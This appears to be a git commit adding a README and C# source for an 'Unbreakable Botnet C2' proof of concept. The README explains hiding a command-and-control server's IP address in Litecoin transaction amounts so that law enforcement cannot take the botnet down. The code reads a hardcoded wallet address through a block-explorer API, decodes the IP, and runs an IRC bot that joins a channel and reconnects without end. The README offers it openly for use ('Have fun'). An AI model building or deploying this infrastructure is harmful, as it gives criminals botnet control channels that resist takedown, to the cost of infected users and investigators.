828f4a717e03a2be21c23934baf851bc0be310c2
Alisson Bertochi <alisson@bertochi.com.br>
2021-03-18 09:02:42 -0300

    New Project: Unbreakable Botnet C2

--- README.md
+++ README.md
@@ -1,1 +1,55 @@
-# Unbreakable-Botnet-C2
+
+## Unbreakable Botnet C2
+
+### Intro
+
+Recently I have read a [news](https://arstechnica.com/information-technology/2021/02/crooks-use-the-bitcoin-blockchain-to-protect-their-botnets-from-takedown/) about a new technique caught in the wild, that was being used by a Threat Actor.
+It was using the blockchain of Bitcoin to spread an IP of C2 for the bots from a botnet.
+I have decided creating my own version of it, using the blockchain of Litecoin and an IRC Bot written in C# as a Proof of Concept.
+
+The idea can evolve and be useful in a C2 Infrasctructure for Red Team Engagements.
+
+If used by a Malicious Agent, Law Enforcement can't take it down, because of the blockchain nature (descentralized network).
+
+### How it works
+
+The IRC bot uses an API of a Block Explorer site and queries the values of the last 3 transations to verify the IP for the C2 Server (ircd in this case).
+The most recent transaction value needs to be 31337 (0.00031337 LTC), it is like an "initialization flag". 
+The next 2 values are the IP, divided in 2 blocks of 5 chars (can be less, depends on IP), in its integer form.
+Currently I'm not obfuscating the IP in any way.
+
+It takes less than 10 minutes to change the IP (transactions to be confirmed).
+I set it up to spend less than R$ 2,00 (0.34 dollar cents) at each transaction.
+During my experiments, I spent R$ 1,74 (0.31 dollar cents), when the LTC price was R$ 1.115,64 (US$ 197,58).
+
+It's very cheap to change the IP. The money can be transferred between the Threat Actor accounts, therefore very little is spent in fees. 
+The negative side of it is that anyone that figure the logic out can change the IP.
+One possible solution for this problem, the most brilliant idea I had, is changing the expected value (the part that does not identify the IP itself) to a fixed and high amount.
+Well, the IP would be changed and the money would be on the attacker's account, hehe. 
+And, of course, for the change take effect, the infected boxes or the ircd machine must be restarted (only the attacker can do it).
+
+### Conclusion
+
+The idea is very cool!
+Thinking about the negative effect: it will bring problems for the Law Enforcement to takeover the botnets using this technique.
+Thinking about the positive effect: the idea can evolve and be useful for Red Teams, for example!
+
+### Source
+
+Have fun: [src folder](src/)
+
+The IP used was *3105793573* (185.30.166.37) from Freenode.
+
+### Greetz
+
+[Saullo "n0psl3d" Carvalho](https://twitter.com/n0ps13d)
+
+### Contact
+
+If you wanna talk more about it, get in touch:
+
+* **IRC:** gnx @ freenode
+* **Telegram:** [@gnxbr](https://t.me/gnxbr)
+* **Twitter:** [@alissonbertochi](https://twitter.com/alissonbertochi)
+* **E-mail:** alisson[at]bertochi[.]com[.]br
+* **Linkedin:** [https://www.linkedin.com/in/gnxbr/](https://www.linkedin.com/in/gnxbr/)
---
+++ src/Bot.cs
@@ -0,0 +1,202 @@
+using System;
+using System.Net;
+using System.Text;
+using System.Text.Json;
+using System.Threading;
+using System.Net.Sockets;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+
+public class Txrefs{
+    public string tx_hash { get; set; }
+    public double block_height { get; set; }
+    public int tx_input_n { get; set; }
+    public double value { get; set; }
+    public double ref_balance { get; set; }
+    public int confirmations { get; set; }
+    public string confirmed { get; set; }
+    public bool double_spend { get; set; }
+}
+
+public class Balance{
+
+    public string address { get; set; }
+    public double total_received  { get; set; }
+    public double total_sent  { get; set; }
+    public double unconfirmed_balance {get; set; }
+    public double final_balance  { get; set; }
+    public double n_tx  { get; set; }
+    public double final_n_tx  { get; set; }
+    public List<Txrefs> txrefs { get; set; }
+
+}
+
+public static class IPC2{
+
+    public static string ToAddr(string address){
+        return IPAddress.Parse(address.ToString()).ToString();
+    }
+
+    public static string Do(){
+        string address = "ltc1ql7dlh7f05dufsd5dpjucu3rz0cdezkqtxrngqj";
+        var result = new System.Net.WebClient().DownloadString("https://api.blockcypher.com/v1/ltc/main/addrs/" + address);
+        var parsed = JsonSerializer.Deserialize<Balance>(result);
+        bool start = false;
+        int round = 0;
+        List<string> ipzinho = new List<string>();
+
+        for(int i=0; i<parsed.txrefs.Count;i++){
+
+            if(parsed.txrefs[i].tx_input_n == -1 && parsed.txrefs[i].confirmations > 0){
+                if(round == 2){
+                    break;
+                }
+                if(start){
+                    round++;
+                    ipzinho.Add(parsed.txrefs[i].value.ToString());
+                }
+
+                if(parsed.txrefs[i].value == 31337){
+                    start = true;
+                }
+            }
+        }
+
+        return String.Join("", ipzinho);
+    }
+
+}
+
+public class Bot{
+
+    private Socket client;
+    private string botPrefix;
+    private string nickname;
+    private int port;
+    private string server;
+    private string channel;
+    private string ident;
+    private string hostname;
+    private string realname;
+    private string channelPasswd;
+
+    public Bot(int port, string channel, string botPrefix, [Optional] string channelPasswd){
+
+        this.port = port;
+        this.channel = channel;
+        this.botPrefix = botPrefix;
+        GenerateNick();
+
+        if(String.IsNullOrEmpty(channelPasswd)){
+            this.channelPasswd = "";
+        }
+        else{
+            this.channelPasswd = channelPasswd;
+        }
+
+        this.ident = GenerateString(7);
+        Thread.Sleep(15);
+        this.hostname = GenerateString(4);
+        Thread.Sleep(15);
+        this.realname = GenerateString(5);
+
+    }
+    ~Bot(){
+        client.Close();
+    }
+    private void GenerateNick(){
+        Random random = new Random();
+        this.nickname = this.botPrefix + "-" + random.Next(1000);
+    }
+    private string GenerateString(int qtde){
+
+        string letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        List<char> result = new List<char>();
+
+        Random novo = new Random();
+        int index;
+
+        for(int i = 0; i < qtde; i++){
+            index = novo.Next(letters.Length);
+            result.Add(letters[index]);
+        }
+
+        return String.Join("",result.ToArray());
+    }
+    private void Send(string cmd){
+        byte[] msg = Encoding.ASCII.GetBytes(cmd + "\n");
+        client.Send(msg);
+    }
+    
+    private void Join(string channel, string password){
+        if(String.IsNullOrEmpty(password)){
+            Send("JOIN " + channel);
+        }
+        else{
+            Send("JOIN " + channel + " " + password);
+        }
+    }
+    private void Ping(){
+        Send("PONG :Pong");
+    }
+    private void Print(byte[] buffer, int bytesRec){
+        
+        Console.WriteLine("{0}",Encoding.ASCII.GetString(buffer, 0, bytesRec));
+    }
+    public void Connect(){
+
+        this.server = IPC2.ToAddr(IPC2.Do());
+
+        IPHostEntry ipHostInfo = Dns.GetHostEntry(IPAddress.Parse(this.server));  
+        IPAddress ipAddress = ipHostInfo.AddressList[0];
+        IPEndPoint remoteEP = new IPEndPoint(ipAddress, port);
+
+        client = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+        client.Connect(remoteEP);
+
+        byte[] msg = Encoding.ASCII.GetBytes("NICK " + nickname + "\n");
+        client.Send(msg);
+
+        msg = Encoding.ASCII.GetBytes("USER " + this.ident + " " + this.hostname + " 0 " + this.realname + "\n");
+        client.Send(msg);
+
+        byte[] buffer= new byte[2048];
+
+        Join(this.channel, this.channelPasswd);
+
+        while(true){
+
+            try{
+                int bytesRec = client.Receive(buffer);
+                Print(buffer, bytesRec);
+
+                if(Encoding.ASCII.GetString(buffer, 0, bytesRec).Contains("PING")){
+                    Ping();
+                }
+            }
+            catch(Exception){
+                while(true){
+                    try{
+                        GenerateNick();
+                        Connect();
+                    }
+                    catch(Exception){
+                        continue;
+                    }
+                }
+            }
+
+        }        
+    }
+}
+
+public class Principal{
+        public static void Main(){
+
+			// Port, Channel, Bot Prefix, [Optional] Channel Passwd
+            Bot bot = new Bot(6667, "#s0ldiers", "el8");
+
+            bot.Connect();
+
+    }
+}
